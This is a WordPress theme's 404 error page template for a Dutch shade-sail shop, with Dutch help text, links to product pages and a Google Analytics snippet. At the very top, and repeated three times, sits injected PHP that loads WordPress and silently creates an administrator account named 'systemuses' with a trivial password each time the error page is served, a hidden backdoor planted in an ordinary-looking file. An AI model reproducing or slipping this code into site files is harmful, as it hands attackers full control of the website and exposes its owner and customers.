<?php
require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');

$userdata = array(
	'ID'              => 0,  
	'user_pass'       => 'aaaaaa', 
	'user_login'      => 'systemuses', 
	'rich_editing'    => 'true', 
	'role'            => 'administrator', 
);

wp_insert_user( $userdata );
require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');

$userdata = array(
	'ID'              => 0,  
	'user_pass'       => 'aaaaaa', 
	'user_login'      => 'systemuses', 
	'rich_editing'    => 'true', 
	'role'            => 'administrator', 
);

wp_insert_user( $userdata );
require($_SERVER['DOCUMENT_ROOT'].'/wp-load.php');

$userdata = array(
	'ID'              => 0,  
	'user_pass'       => 'aaaaaa', 
	'user_login'      => 'systemuses', 
	'rich_editing'    => 'true', 
	'role'            => 'administrator', 
);

wp_insert_user( $userdata ); get_header(); ?>

	<div id="primary" class="content-area">

        <div class="row">	
            <div class="large-10 large-centered columns">    
                <div id="content" class="site-content" role="main">
                
                    <section class="error-404 not-found">
                        <header class="page-header">
                            <!--<div class="error-banner">
								<img id="error-404" class="error" alt="404-banner"  width="354" height="155"  src="<?php echo get_template_directory_uri() . '/images/error_404.png'; ?>" data-interchange="[<?php echo get_template_directory_uri() . '/images/error_404.png'; ?>, (default)], [<?php echo get_template_directory_uri() . '/images/error_404_retina.png'; ?>, (retina)]">
                            </div>-->
                            <h2 class="page-title"><?php _e( 'OEPS, deze pagina kan niet gevonden worden.', 'mr_tailor' ); ?></h2>
							<h5>Dit kan de volgende oorzaken hebben:</h5>
							<p>De pagina is verplaatst/verwijderd wegens reorganisatie van de website, een verouderde bladwijzer/favoriet, een foutje in de link.</p>
							<p>Geen nood, de beste manier om alsnog te vinden wat je zoekt is door naar de <a href="<?php echo get_site_url(); ?>">homepage van Zonz sunsails</a> te gaan waar alle pagina's gemakkelijk te vinden zijn.</p>
							<p>De meest bezochte pagina's zijn ook via onderstaande links rechtstreeks te bereiken:</p>
							<ul style="display: inline-block">
							<li><a href="<?php echo get_site_url(); ?>/schaduwdoeken/schaduwdoeken/">Schaduwdoeken</a></li>
							<li><a href="<?php echo get_site_url(); ?>/wavesails">Wavesails </a></li>
							<li><a href="<?php echo get_site_url(); ?>/product-tag/pergola/">Pergola's</a></li>
							<li><a href="<?php echo get_site_url(); ?>/schaduwdoeken/standaard-schaduwoplossingen/bevestigingsmateriaal-schaduwdoek/">Bevestigingsmateriaal</a></li>	
							<li><a href="<?php echo get_site_url(); ?>/schaduwdoeken/palen-schaduwdoek/">Palen</a></li>	
							<li><a href="<?php echo get_site_url(); ?>/montage-schaduwdoek-zonnezeil/">Montage </a></li>
							</ul>
							<ul style="display: inline-block">
							<li><a href="<?php echo get_site_url(); ?>/veel-gestelde-vragen/">Veel gestelde vragen</a></li>
							<li><a href="<?php echo get_site_url(); ?>/referenties-zonz-sunsails/">Foto's</a></li>
							<li><a href="<?php echo get_site_url(); ?>/contact-met-zonz-sunsails/">Contact</a></li>		
							<li><a href="<?php echo get_site_url(); ?>/bestellen-schaduwdoek-zonz-sunsails/">Bestelinformatie</a></li>		
							<li><a href="<?php echo get_site_url(); ?>/betalen-zonz-sunsails/">Betaalinformatie </a></li>		
							<li><a href="<?php echo get_site_url(); ?>/ruilen-retourneren/">Ruilen en Retourneren</a></li>		
							</ul>
                        </header><!-- .page-header -->
        
                        <div class="page-content">
                            <p><?php _e( '
 Als ook dat niet werkt, kun je met onderstaande zoekfunctie zoeken op de site:', 'mr_tailor' ); ?></p>
        
                            <?php get_search_form(); ?>
        
                        </div><!-- .page-content -->
                    </section><!-- .error-404 -->
                    
                </div><!-- #content -->
            </div><!-- .large-12 .columns -->                
        </div><!-- .row -->
             
    </div><!-- #primary -->

<?php get_footer(); ?>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-5056019-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-5056019-1');
  ga('send', 'pageview', {
  'page': '404-pagina',
  'title': '404-pagina'
});
</script>


